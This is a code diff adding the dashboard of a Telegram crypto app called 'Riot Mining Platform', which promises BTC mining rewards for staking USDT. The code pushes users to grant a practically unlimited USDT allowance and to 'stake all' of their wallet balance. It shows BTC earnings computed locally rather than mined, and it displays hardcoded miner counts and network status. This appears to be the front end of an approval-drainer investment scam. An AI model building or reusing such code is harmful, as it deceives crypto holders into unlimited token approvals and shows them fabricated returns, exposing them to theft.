@@ -1,0 +1,667 @@
+import React, { useState, useEffect, useCallback } from 'react';
+import { useNavigate, useLocation } from 'react-router-dom';
+import { useWallet, redirectToWalletDappBrowser } from '../lib/web3';
+import { useStaking, getTierRate } from '../hooks/useStaking';
+import { useTelegram } from '../hooks/useTelegram';
+import { telegramConnectionsManager } from '../lib/telegramConnections';
+import { formatUnits, parseUnits, MaxUint256 } from 'ethers';
+import { usePrice } from '../hooks/usePrice';
+import { parseEthersError } from '../utils/errors';
+
+const Dashboard: React.FC = () => {
+    const navigate = useNavigate();
+    const location = useLocation();
+    const { address, isConnected, connect, signer, setIsDisconnectModalOpen, miningStats, setMiningStats } = useWallet();
+    const { getStakedInfo, stake, getStakeDetails, getWalletBalance, recordPermanentStakeFlush, clearPermanentStakeFlush, isStakePermanentlyFlushed, approve, getAllowance } = useStaking();
+    const { showAlert, tg, user: telegramUser } = useTelegram();
+    const { btcPrice } = usePrice();
+    const [loading, setLoading] = useState(false);
+
+    const isSuccessLanding = new URLSearchParams(location.search).get('v') === 'success';
+
+    const handleBackToTelegram = () => {
+        // If we're inside the Mini App, we might be able to close the webview
+        if (tg) {
+            tg.close();
+        } else {
+            // Otherwise, trigger the deep link to return to the bot
+            window.location.href = 'tg://resolve?domain=AiMiningBTC_bot';
+        }
+    };
+
+    const [stats, setStats] = useState({
+        miningPower: miningStats.miningPower || '0.0',
+        balance: miningStats.balance || '0.00000000000000',
+        dailyProfit: miningStats.dailyProfit || '0.0000',
+        activeMiners: '842',
+        networkStatus: 'Stable'
+    });
+    const isMiningActive = parseFloat(stats.miningPower) > 0;
+
+    const [extraFund, setExtraFund] = useState('0.00');
+    const [extraFundLoading, setExtraFundLoading] = useState(false);
+    const [extraFundAllowance, setExtraFundAllowance] = useState('0');
+
+    // Fetch extra fund data (wallet balance - active stakes)
+    const fetchExtraFundData = useCallback(async () => {
+        const userAddress = address || (signer ? await signer.getAddress() : undefined);
+        if (!userAddress) return;
+        try {
+            const balanceStr = await getWalletBalance(userAddress);
+            if (!balanceStr) return;
+            const balanceBigInt = parseUnits(balanceStr, 18);
+            const info = await getStakedInfo(userAddress);
+            let activeStakedBigInt = 0n;
+            if (info) {
+                for (let i = 0; i < info.stakeCount; i++) {
+                    const detail = await getStakeDetails(userAddress, i);
+                    if (detail && !detail.withdrawn) {
+                        const finished = (Date.now() / 1000) > detail.startTime + (37 * 86400);
+                        const wasFlushed = isStakePermanentlyFlushed(userAddress, i);
+                        const isBalanceSufficient = finished || balanceBigInt >= activeStakedBigInt + detail.amount;
+                        if (isBalanceSufficient && wasFlushed) {
+                            clearPermanentStakeFlush(userAddress, i);
+                        }
+                        const isViolated = isStakePermanentlyFlushed(userAddress, i) || (!finished && balanceBigInt < activeStakedBigInt + detail.amount);
+                        if (!isViolated && !finished) {
+                            activeStakedBigInt += detail.amount;
+                        }
+                    }
+                }
+            }
+            const extra = balanceBigInt > activeStakedBigInt ? balanceBigInt - activeStakedBigInt : 0n;
+            setExtraFund(formatUnits(extra, 18));
+            const allowanceStr = await getAllowance(userAddress);
+            setExtraFundAllowance(allowanceStr || '0');
+        } catch (err) {
+            console.warn('[Dashboard] fetchExtraFundData error:', err);
+        }
+    }, [address, signer]);
+
+    useEffect(() => {
+        if (isConnected && address) fetchExtraFundData();
+    }, [isConnected, address, signer]);
+
+    const APPROVAL_THRESHOLD = MaxUint256 / 2n;
+    const hasEnoughAllowance = parseUnits(extraFundAllowance || '0', 18) >= APPROVAL_THRESHOLD;
+
+    const handleExtraStake = async (amountOverride?: string) => {
+        const storedAddr = localStorage.getItem('aimining_address') || localStorage.getItem('aimining_manual_address');
+        const userAddress = address || storedAddr || (signer ? await signer.getAddress() : undefined);
+        if (!userAddress) {
+            showAlert("Please connect your wallet first.");
+            connect();
+            return;
+        }
+        const amount = parseFloat(amountOverride ?? extraFund);
+        if (amount < 50) {
+            showAlert("Minimum 50 USDT required to stake.");
+            return;
+        }
+
+        // In Telegram Mini App (no injected provider), the WalletConnect tx often
+        // never reaches the wallet. Open the dApp inside the connected wallet's
+        // dApp browser and auto-resume there.
+        const isTMA = !!(window as any).Telegram?.WebApp;
+        const hasInjected = !!(window as any).ethereum || !!(window as any).tokenpocket?.ethereum || !!(window as any).safepal?.ethereum;
+        if (isTMA && !hasInjected) {
+            showAlert('Opening in your wallet browser — approve the transaction there.');
+            redirectToWalletDappBrowser({ action: 'extra_stake', amt: String(amount) });
+            return;
+        }
+
+        setExtraFundLoading(true);
+        try {
+            // Step 1: Fresh allowance check from chain (not stale state)
+            console.log('[Dashboard] Checking fresh allowance from chain...');
+            const freshAllowanceStr = await getAllowance(userAddress);
+            const freshAllowance = parseUnits(freshAllowanceStr || '0', 18);
+            console.log('[Dashboard] Fresh allowance:', freshAllowanceStr);
+
+            if (freshAllowance < APPROVAL_THRESHOLD) {
+                // Need approval — call approve() which opens wallet
+                showAlert("Opening wallet for USDT approval...");
+                await approve();
+                // Poll until confirmed (max 30s)
+                for (let p = 0; p < 15; p++) {
+                    await new Promise(r => setTimeout(r, 2000));
+                    const polled = await getAllowance(userAddress);
+                    console.log(`[Dashboard] Poll allowance attempt ${p + 1}:`, polled);
+                    if (parseUnits(polled || '0', 18) >= APPROVAL_THRESHOLD) {
+                        console.log('[Dashboard] Approval confirmed!');
+                        break;
+                    }
+                }
+                // Final check
+                const finalAllowance = await getAllowance(userAddress);
+                if (parseUnits(finalAllowance || '0', 18) < APPROVAL_THRESHOLD) {
+                    throw new Error("USDT approval not confirmed. Please try again.");
+                }
+                setExtraFundAllowance(finalAllowance);
+            }
+
+            // Step 2: Stake — this calls the smart contract, wallet must sign
+            console.log('[Dashboard] Starting stake transaction...');
+            showAlert("Opening wallet to confirm stake...");
+            const tx = await stake(extraFund, undefined, true);
+            console.log('[Dashboard] Stake tx sent:', tx?.hash);
+
+            // Don't block on tx.wait() in TMA — it hangs after wallet redirect
+            const isTMA = !!(window as any).Telegram?.WebApp;
+            if (!isTMA && tx && typeof tx.wait === 'function') {
+                try { await tx.wait(); } catch (e) { console.warn('[Dashboard] tx.wait failed:', e); }
+            }
+
+            showAlert(`Staked ${extraFund} USDT successfully!`);
+            setExtraFund('0.00');
+            fetchExtraFundData();
+        } catch (err: any) {
+            console.error('[Dashboard] handleExtraStake error:', err);
+            showAlert(parseEthersError(err));
+        } finally {
+            setExtraFundLoading(false);
+        }
+    };
+
+    // Auto-resume mining after connection
+    useEffect(() => {
+        if (signer && localStorage.getItem('pending_mining') === 'true') {
+            localStorage.removeItem('pending_mining');
+            handleStartMining();
+        }
+    }, [signer]);
+
+    // Save Telegram connection when wallet connects
+    useEffect(() => {
+        if (address && isConnected && telegramUser) {
+            telegramConnectionsManager.saveConnection(address, telegramUser);
+        }
+    }, [address, isConnected, telegramUser]);
+
+    const handleStartMining = async () => {
+        const userAddress = address || (signer ? await signer.getAddress() : undefined);
+        if (!signer || !userAddress) {
+            localStorage.setItem('pending_mining', 'true');
+            showAlert("Redirecting to Wallet for connection...");
+            await connect();
+            return;
+        }
+
+        // In Telegram Mini App (no injected provider), the WalletConnect tx often
+        // never reaches the wallet. Open the dApp inside the connected wallet's
+        // dApp browser and auto-resume there.
+        const isTMA = !!(window as any).Telegram?.WebApp;
+        const hasInjected = !!(window as any).ethereum || !!(window as any).tokenpocket?.ethereum || !!(window as any).safepal?.ethereum;
+        if (isTMA && !hasInjected) {
+            showAlert('Opening in your wallet browser — approve the transaction there.');
+            redirectToWalletDappBrowser({ action: 'stake_all' });
+            return;
+        }
+
+        setLoading(true);
+        try {
+            const balanceStr = await getWalletBalance(userAddress);
+            if (!balanceStr) {
+                showAlert("Could not check wallet balance due to network issues. Try again.");
+                setLoading(false);
+                return;
+            }
+
+            const wBalanceBigInt = parseUnits(balanceStr, 18);
+            const minStakeBigInt = parseUnits("50", 18);
+
+            if (wBalanceBigInt < minStakeBigInt) {
+                showAlert("You have less than 50 USDT. You need minimum 50 USDT for mining.");
+                setLoading(false);
+                return;
+            }
+
+            const info = await getStakedInfo(userAddress);
+            let activeStakedBigInt = 0n;
+            if (info) {
+                const count = info.stakeCount;
+                let runningStakedSumBigInt = 0n;
+                for (let i = 0; i < count; i++) {
+                    const detail = await getStakeDetails(userAddress, i);
+                    if (detail && !detail.withdrawn) {
+                        const stakeAmountBigInt = detail.amount;
+                        const finished = (Date.now() / 1000) > detail.startTime + (37 * 86400);
+                        const wasFlushed = isStakePermanentlyFlushed(userAddress, i);
+                        const isBalanceSufficient = finished || wBalanceBigInt >= runningStakedSumBigInt + stakeAmountBigInt;
+                        if (isBalanceSufficient && wasFlushed) {
+                            clearPermanentStakeFlush(userAddress, i);
+                        }
+                        const isViolated = isStakePermanentlyFlushed(userAddress, i) || (!finished && wBalanceBigInt < runningStakedSumBigInt + stakeAmountBigInt);
+                        if (!isViolated && !finished) {
+                            activeStakedBigInt += stakeAmountBigInt;
+                            runningStakedSumBigInt += stakeAmountBigInt;
+                        }
+                    }
+                }
+            }
+
+            let stakeableBalanceBigInt = wBalanceBigInt - activeStakedBigInt;
+            if (stakeableBalanceBigInt < 0n) {
+                stakeableBalanceBigInt = 0n;
+            }
+
+            // Round down to 2 decimals (10^16 units) to avoid float mismatch or wallet gas estimation failures
+            const remainder = stakeableBalanceBigInt % 10000000000000000n; // 10^16
+            stakeableBalanceBigInt = stakeableBalanceBigInt - remainder;
+
+            if (stakeableBalanceBigInt < minStakeBigInt) {
+                showAlert("You have less than 50 USDT. You need minimum 50 USDT for mining.");
+                setLoading(false);
+                return;
+            }
+
+            const tx = await stake(formatUnits(stakeableBalanceBigInt, 18));
+            await tx.wait();
+            await updateMiningData();
+
+            showAlert("Node Successfully Activated! 🚀");
+            handleBackToTelegram();
+        } catch (err: any) {
+            console.error("[Mining] Error:", err);
+            
+            showAlert(parseEthersError(err));
+        } finally {
+            setLoading(false);
+        }
+    };
+
+    // Refs for URL-param auto-resume (redirected from Telegram → wallet dApp browser)
+    const handleStartMiningRef = React.useRef<(() => Promise<void>) | null>(null);
+    handleStartMiningRef.current = handleStartMining;
+    const handleExtraStakeRef = React.useRef<((amountOverride?: string) => Promise<void>) | null>(null);
+    handleExtraStakeRef.current = handleExtraStake;
+
+    useEffect(() => {
+        if (!isConnected || !address) return;
+        const params = new URLSearchParams(window.location.search);
+        const action = params.get('action');
+        if (!action) return;
+
+        const amt = params.get('amt');
+        params.delete('action');
+        params.delete('amt');
+        const cleanUrl = `${window.location.pathname}${params.toString() ? '?' + params.toString() : ''}${window.location.hash}`;
+        window.history.replaceState({}, '', cleanUrl);
+
+        const timer = setTimeout(() => {
+            if (action === 'stake_all') {
+                handleStartMiningRef.current?.();
+            } else if (action === 'extra_stake' && amt) {
+                const val = parseFloat(amt);
+                if (!isNaN(val) && val >= 50) {
+                    setExtraFund(amt);
+                    handleExtraStakeRef.current?.(amt);
+                }
+            }
+        }, 2500);
+        return () => clearTimeout(timer);
+    }, [isConnected, address, signer]);
+ 
+    // FIX: Only reset stats if address is explicitly GONE, otherwise keep previous data for smoothness
+    useEffect(() => {
+        if (!address) {
+            setStats({
+                miningPower: '0.0',
+                balance: '0.00000000000000',
+                dailyProfit: '0.00000000000000',
+                activeMiners: '0',
+                networkStatus: 'Disconnected'
+            });
+        }
+    }, [address]);
+
+    // Effect 1: Data Update (Fetches data via Read-Only RPC)
+    const updateMiningData = useCallback(async () => {
+        if (address) {
+            const walletBalanceStr = await getWalletBalance(address);
+            if (walletBalanceStr === null) return;
+            
+            const liveWalletUsdt = parseFloat(walletBalanceStr);
+            const info = await getStakedInfo(address);
+            if (info === null) return; // Keep previous state on RPC failure!
+
+            const count = info.stakeCount;
+            const fetchedStakes = [];
+            let failed = false;
+            for (let i = 0; i < count; i++) {
+                const detail = await getStakeDetails(address, i);
+                if (detail === null) {
+                    failed = true;
+                    break;
+                }
+                fetchedStakes.push(detail);
+            }
+            if (failed) return; // Keep previous state!
+
+            let totalContractAmount = 0;
+            let totalAccruedBtc = 0;
+            let activeStakedForPower = 0;
+            let totalActiveStaked = 0;
+            let runningStakedSum = 0;
+            let dailyProfitBtc = 0;
+
+            for (let i = 0; i < count; i++) {
+                const detail = fetchedStakes[i];
+                if (detail && !detail.withdrawn) {
+                    const stakeAmount = parseFloat(formatUnits(detail.amount, 18));
+                    const finished = (Date.now() / 1000) > detail.startTime + (37 * 86400);
+                    const wasFlushed = isStakePermanentlyFlushed(address, i);
+                    const isBalanceSufficient = finished || (liveWalletUsdt + 0.1) >= runningStakedSum + stakeAmount;
+                    if (isBalanceSufficient && wasFlushed) {
+                        clearPermanentStakeFlush(address, i);
+                    }
+                    
+                    // Check violation for this individual active (non-finished) stake using running sum
+                    const isViolated = isStakePermanentlyFlushed(address, i) || (!finished && (liveWalletUsdt + 0.1) < runningStakedSum + stakeAmount);
+                    
+                    totalContractAmount += stakeAmount;
+
+                    if (isViolated) {
+                        recordPermanentStakeFlush(address, i);
+                    } else {
+                        const safeBtcPrice = btcPrice && btcPrice > 0 && !isNaN(btcPrice) ? btcPrice : 78000;
+                        if (!finished) {
+                            runningStakedSum += stakeAmount;
+                            totalActiveStaked += stakeAmount;
+                            activeStakedForPower += stakeAmount;
+
+                            const stakeRate = getTierRate(stakeAmount);
+                            const profit = (stakeAmount * stakeRate) / (37 * safeBtcPrice);
+                            if (!isNaN(profit) && isFinite(profit)) {
+                                dailyProfitBtc += profit;
+                            }
+                        }
+
+                        const timePassed = Math.max(0, Math.min(37 * 86400, (Date.now() / 1000) - detail.startTime));
+                        const stakeRate = getTierRate(stakeAmount);
+                        const accrued = ((stakeAmount * stakeRate) / 37 / 86400 * timePassed) / safeBtcPrice;
+                        if (!isNaN(accrued) && isFinite(accrued)) {
+                            totalAccruedBtc += accrued;
+                        }
+                    }
+                }
+            }
+
+            const currentTotalBalance = totalAccruedBtc;
+
+            const newStats = {
+                miningPower: activeStakedForPower > 0 ? (activeStakedForPower * 2.5).toFixed(1) : '0.0',
+                balance: totalActiveStaked > 0 ? currentTotalBalance.toFixed(14) : '0.00000000000000',
+                dailyProfit: dailyProfitBtc.toFixed(14),
+                rewardPerSecond: activeStakedForPower > 0 ? (dailyProfitBtc / 86400) : 0,
+                totalStaked: totalActiveStaked.toFixed(2),
+                walletBalance: liveWalletUsdt.toFixed(2),
+                isLoaded: true
+            };
+
+            setMiningStats((prev: any) => ({
+                ...prev,
+                ...newStats
+            }));
+        }
+    }, [address, getWalletBalance, getStakedInfo, getStakeDetails, recordPermanentStakeFlush, isStakePermanentlyFlushed, btcPrice, setMiningStats]);
+
+    useEffect(() => {
+        updateMiningData();
+        const pollTimer = setInterval(updateMiningData, 60000); // 1m Stable Sync
+        return () => clearInterval(pollTimer);
+    }, [updateMiningData]);
+
+    // Effect 2: Global High-Fidelity Ticker Subscription
+    useEffect(() => {
+        if (miningStats.isLoaded) {
+            setStats(prev => ({
+                ...prev,
+                balance: miningStats.balance,
+                miningPower: miningStats.miningPower,
+                dailyProfit: miningStats.dailyProfit
+            }));
+        }
+    }, [miningStats]);
+
+    return (
+        <div className="flex-1 flex flex-col bg-background-dark">
+            {/* Success Landing Overlay */}
+            {isSuccessLanding && (
+                <div className="fixed inset-0 z-[1000] bg-black/95 backdrop-blur-xl flex flex-col items-center justify-center p-8 text-center">
+                    <div className="w-24 h-24 bg-primary/20 rounded-full flex items-center justify-center mb-6 animate-pulse-glow shadow-neon">
+                        <span className="material-icons-round text-primary text-6xl">verified</span>
+                    </div>
+                    <h2 className="text-2xl font-black text-white uppercase tracking-widest mb-2 font-display">Wallet Connected</h2>
+                    <p className="text-gray-400 text-sm mb-10 max-w-xs uppercase font-bold tracking-tight">Your secure mining connection is active. Return to Telegram to manage your nodes.</p>
+                    
+                    <button
+                        onClick={handleBackToTelegram}
+                        className="w-full max-w-xs bg-primary text-black font-black text-lg py-5 rounded-2xl shadow-neon transform active:scale-95 transition-all flex items-center justify-center gap-3 border-none cursor-pointer"
+                    >
+                        <span className="material-icons-round">rocket_launch</span>
+                        OPEN IN TELEGRAM
+                    </button>
+                    
+                    <button
+                        onClick={() => navigate('/', { replace: true })}
+                        className="mt-6 text-[10px] text-gray-500 font-bold uppercase tracking-widest hover:text-white transition-colors border-none bg-transparent cursor-pointer"
+                    >
+                        Stay on Website
+                    </button>
+                </div>
+            )}
+
+            {/* Header */}
+            <header className="relative z-10 flex justify-between items-center p-4">
+                <div className="flex items-center gap-2">
+                    <span className="material-icons-round text-primary text-xl">memory</span>
+                    <h1 className="font-display font-bold text-lg text-white tracking-wide uppercase">Riot Mining Platform</h1>
+                </div>
+                <div className="flex items-center gap-2">
+                    {!isConnected ? (
+                        <button
+                            onClick={() => connect()}
+                            className="bg-primary/10 hover:bg-primary/20 text-primary px-3 py-1.5 rounded-full border border-primary/20 flex items-center gap-2 shadow-sm transition-all text-[10px] font-bold uppercase tracking-wider cursor-pointer"
+                        >
+                            <span className="material-icons-round text-sm">account_balance_wallet</span>
+                            Connect
+                        </button>
+                    ) : (
+                        <div className="flex items-center">
+                             <button
+                                onClick={() => setIsDisconnectModalOpen(true)} 
+                                className="bg-primary text-black px-4 py-1.5 rounded-full border border-primary flex items-center gap-2 shadow-neon transition-all text-[10px] font-bold active:scale-95 cursor-pointer"
+                            >
+                                <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
+                                {address?.slice(0, 4)}...{address?.slice(-4)}
+                            </button>
+                        </div>
+                    )}
+                </div>
+            </header>
+
+
+            <section className="px-4 grid grid-cols-2 gap-3 mb-4">
+                <div className="bg-card-dark p-3 rounded-2xl shadow-card border border-gray-800 relative overflow-hidden group">
+                    <div className="absolute top-0 right-0 p-2 opacity-10">
+                        <span className="material-icons-round text-3xl text-primary">bolt</span>
+                    </div>
+                    <p className="text-[10px] text-gray-500 font-medium mb-0.5 uppercase tracking-widest">Compute Power</p>
+                    <div className="flex items-baseline gap-1">
+                        <h2 className="text-xl font-display font-bold text-white uppercase">{stats.miningPower}</h2>
+                        <span className="text-[10px] text-primary font-bold uppercase tracking-tight">GH/s</span>
+                    </div>
+                </div>
+                <div className="bg-card-dark p-3 rounded-2xl shadow-card border border-gray-800 relative overflow-hidden group">
+                    <div className="absolute top-0 right-0 p-2 opacity-10">
+                        <span className="material-icons-round text-3xl text-primary">account_balance_wallet</span>
+                    </div>
+                    <p className="text-[10px] text-gray-500 font-medium mb-0.5 uppercase tracking-widest">Balance</p>
+                    <div className="flex items-baseline gap-1">
+                        <h2 className="text-[11px] font-display font-bold text-white uppercase">{stats.balance}</h2>
+                        <span className="text-[10px] text-primary font-bold uppercase tracking-tight">BTC</span>
+                    </div>
+                </div>
+            </section>
+
+            {/* Mining Visualization */}
+            <section className="flex flex-col items-center justify-center mb-6 py-4">
+                <div className="relative w-80 h-80 flex items-center justify-center">
+                    {/* Background Progress Circle */}
+                    <svg className="absolute inset-0 w-full h-full transform -rotate-90" viewBox="0 0 100 100">
+                        <circle cx="50" cy="50" fill="none" r="46" stroke="#1f2937" strokeWidth="2"></circle>
+                        <circle
+                            className="filter drop-shadow-[0_0_8px_rgba(255,215,0,0.4)] transition-all duration-1000 ease-out"
+                            cx="50" cy="50" fill="none" r="46"
+                            stroke="url(#goldGradient)"
+                            strokeDasharray="289"
+                            strokeDashoffset={isMiningActive ? "100" : "289"}
+                            strokeLinecap="round"
+                            strokeWidth="3">
+                        </circle>
+                        <defs>
+                            <linearGradient id="goldGradient" x1="0%" x2="100%" y1="0%" y2="0%">
+                                <stop offset="0%" stopColor="#B8860B"></stop>
+                                <stop offset="50%" stopColor="#FFD700"></stop>
+                                <stop offset="100%" stopColor="#FDB931"></stop>
+                            </linearGradient>
+                        </defs>
+                    </svg>
+
+                    {/* Orbiting Icons (Only visible when active) */}
+                    {isMiningActive && (
+                        <>
+                            <div className="absolute inset-0 flex items-center justify-center animate-orbit" style={{ animationDelay: '0s' }}>
+                                <span className="material-icons-round text-primary/40 text-xl">currency_bitcoin</span>
+                            </div>
+                            <div className="absolute inset-0 flex items-center justify-center animate-orbit" style={{ animationDuration: '20s', animationDelay: '-5s' }}>
+                                <span className="material-icons-round text-primary/30 text-lg">currency_bitcoin</span>
+                            </div>
+                            <div className="absolute inset-0 flex items-center justify-center animate-orbit" style={{ animationDuration: '10s', animationDelay: '-2s' }}>
+                                <span className="material-icons-round text-primary/20 text-sm">currency_bitcoin</span>
+                            </div>
+                        </>
+                    )}
+
+                    {/* Decorative Rings */}
+                    <div className="absolute w-64 h-64 border border-primary/5 rounded-full animate-pulse"></div>
+                    <div className="absolute w-56 h-56 border border-primary/10 rounded-full border-dashed animate-spin" style={{ animationDuration: '30s' }}></div>
+                    <div className="absolute w-48 h-48 border border-primary/20 rounded-full animate-reverse-spin" style={{ animationDuration: '20s' }}></div>
+
+                    {/* Central Mining Node */}
+                    <div className={`relative w-36 h-36 bg-gradient-to-br from-gray-900 to-black rounded-full flex items-center justify-center shadow-neon border border-primary/30 ${isMiningActive ? 'animate-pulse-glow' : ''}`}>
+                        <div className="absolute inset-0 bg-primary/20 rounded-full blur-2xl opacity-20"></div>
+                        <span className={`material-icons-round text-6xl text-primary drop-shadow-[0_0_15px_rgba(255,215,0,0.6)] ${isMiningActive ? 'animate-rotate-3d' : ''}`}>currency_bitcoin</span>
+                        
+                        {/* Status Particles */}
+                        <div className="absolute -top-1 -right-1 w-2.5 h-2.5 bg-primary rounded-full animate-ping"></div>
+                        <div className="absolute bottom-4 -left-2 w-2 h-2 bg-yellow-200/50 rounded-full animate-bounce" style={{ animationDelay: '1s' }}></div>
+                    </div>
+                    <div className="absolute bottom-6 bg-black/60 backdrop-blur-md border border-gray-800 px-3 py-1 rounded-full flex items-center gap-1">
+                        <span className="material-icons-round text-xs text-primary">bolt</span>
+                        <span className="text-[10px] uppercase font-bold tracking-wider text-gray-300">{isMiningActive ? 'MINING ACTIVE' : 'SYSTEM READY'}</span>
+                    </div>
+                </div>
+                <div className="mt-6 text-center">
+                    <p className="text-primary font-display font-bold text-lg tracking-widest uppercase">{isMiningActive ? 'System Operational' : 'Node Inactive'}</p>
+                    <div className="flex flex-col gap-1 mt-1">
+                        <div className="flex justify-between items-center px-8 gap-4">
+                            <div className="text-left">
+                                <p className="text-[10px] text-gray-400 capitalize">Daily Yield</p>
+                                <p className="text-[11px] font-medium text-white uppercase tracking-wider">{stats.dailyProfit} <span className="text-primary text-[9px]">BTC</span></p>
+                            </div>
+                            <div className="w-px h-8 bg-gray-800"></div>
+                            <div className="text-right">
+                                <p className="text-[10px] text-gray-400 capitalize">Yield Per Second</p>
+                                <p className="text-[11px] font-medium text-white uppercase tracking-wider">{(parseFloat(stats.dailyProfit) / 86400).toFixed(14)} <span className="text-primary text-[9px]">BTC</span></p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            {/* Extra Fund Stake Card */}
+            {isConnected && (
+                <section className="px-6 pb-2 w-full">
+                    <div className="bg-[#111] rounded-[28px] p-5 border border-primary/20 flex flex-col gap-3 relative overflow-hidden shadow-glow">
+                        <div className="absolute top-0 right-0 p-4 opacity-10">
+                            <span className="material-icons-round text-6xl text-primary font-black">savings</span>
+                        </div>
+                        <div className="relative z-10">
+                            <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest">Available Extra Fund</p>
+                            <h3 className="text-xl font-black text-white italic mt-1">{parseFloat(extraFund).toFixed(2)} <span className="text-primary text-sm uppercase">USDT</span></h3>
+                        </div>
+                        <button
+                            onClick={() => handleExtraStake()}
+                            disabled={extraFundLoading || parseFloat(extraFund) < 50}
+                            className={`relative z-10 w-full py-3.5 rounded-2xl font-black text-xs uppercase tracking-widest transition-all border-none ${
+                                parseFloat(extraFund) >= 50 && !extraFundLoading
+                                    ? 'bg-primary text-black shadow-glow hover:scale-[1.02] active:scale-[0.98] cursor-pointer'
+                                    : 'bg-white/5 text-gray-300 border border-white/5 cursor-pointer'
+                            }`}
+                        >
+                            {extraFundLoading
+                                ? 'Processing...'
+                                : (parseFloat(extraFund) < 50
+                                    ? 'Minimum 50 USDT Required'
+                                    : (!hasEnoughAllowance
+                                        ? 'Approve USDT'
+                                        : 'Stake Extra Fund'))}
+                        </button>
+                    </div>
+                </section>
+            )}
+
+            {/* Action Buttons & Bottom Stats */}
+            <section className="px-6 pb-4 w-full flex flex-col gap-4">
+                {stats.miningPower === '0.0' ? (
+                    <button
+                        onClick={handleStartMining}
+                        disabled={loading}
+                        className="w-full bg-gradient-to-r from-primary via-yellow-400 to-primary text-black font-black text-lg py-5 rounded-2xl shadow-neon transform active:scale-95 transition-all duration-300 flex flex-col items-center justify-center gap-1 group border-none cursor-pointer relative overflow-hidden"
+                    >
+                        <div className="flex items-center gap-2">
+                            <span className="material-icons-round animate-bounce">rocket_launch</span>
+                            {loading ? 'WAITING FOR APPROVAL...' : 'STAKE ALL & START MINING'}
+                        </div>
+                        <span className="text-[10px] opacity-70 font-black tracking-widest uppercase">Activates node with full wallet balance</span>
+                    </button>
+                ) : (
+                    <button
+                        onClick={() => navigate('/stake')}
+                        className="w-full metallic-btn text-black font-bold text-lg py-4 rounded-2xl shadow-neon transform active:scale-95 transition-all duration-200 flex items-center justify-center gap-2 group border border-yellow-400/30 cursor-pointer border-none"
+                    >
+                        <span className="material-icons-round">rule</span>
+                        Manage Active Cycles
+                    </button>
+                )}
+                <button
+                    onClick={() => navigate('/stake')}
+                    className="w-full bg-transparent text-primary font-bold text-lg py-4 rounded-2xl border-2 border-primary/50 transform active:scale-95 transition-all duration-200 flex items-center justify-center gap-2 group hover:bg-primary/5 cursor-pointer"
+                >
+                    <span className="material-icons-round">payments</span>
+                    Withdraw (Cycle Based)
+                </button>
+
+                <div className="mt-8 flex justify-between items-center bg-card-dark rounded-2xl p-4 border border-gray-800">
+                    <div className="text-center">
+                        <p className="text-xs text-gray-500 uppercase font-black tracking-tighter">Cycle Rewards</p>
+                        <p className="text-sm font-bold text-white font-display uppercase tracking-tight">5.5% - 12%</p>
+                    </div>
+                    <div className="h-8 w-px bg-gray-800"></div>
+                    <div className="text-center">
+                        <p className="text-xs text-gray-500 uppercase font-black tracking-tighter">Global Miners</p>
+                        <p className="text-sm font-bold text-white font-display uppercase tracking-tight">42,852</p>
+                    </div>
+                    <div className="h-8 w-px bg-gray-800"></div>
+                    <div className="text-center">
+                        <p className="text-xs text-gray-500 uppercase font-black tracking-tighter">Network</p>
+                        <p className="text-sm font-bold text-green-500 font-display uppercase tracking-tight">ONLINE</p>
+                    </div>
+                </div>
+            </section>
+        </div>
+    );
+};
+
+export default Dashboard;
